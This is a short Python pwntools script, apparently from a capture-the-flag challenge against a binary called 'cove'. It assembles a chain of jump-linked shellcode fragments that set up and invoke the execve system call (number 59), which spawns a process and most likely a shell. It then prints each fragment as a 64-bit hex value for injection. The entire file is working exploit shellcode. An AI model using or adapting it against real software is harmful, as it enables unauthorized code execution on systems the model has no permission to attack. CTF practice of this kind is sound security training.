from pwn import *

context.binary = ELF('./cove')

shellcode = []
shellcode.append(asm("add cx, 96; push rcx; jmp $+5"))
shellcode.append(asm("pop rdi; add cx, 0x12; jmp $+5"))
shellcode.append(asm("push 59; pop rax; push 0; push rcx; jmp $+4"))
shellcode.append(asm("add cx, 5; push rcx; jmp $+5"))
shellcode.append(asm("add cx, 4; push rcx; jmp $+5"))
shellcode.append(asm("add cx, 6; push rcx; jmp $+5"))
shellcode.append(asm("push rdi; push rsp; pop rsi; syscall"))

for i in shellcode:
    print(hex(u64(i.ljust(8, b'\0'))))
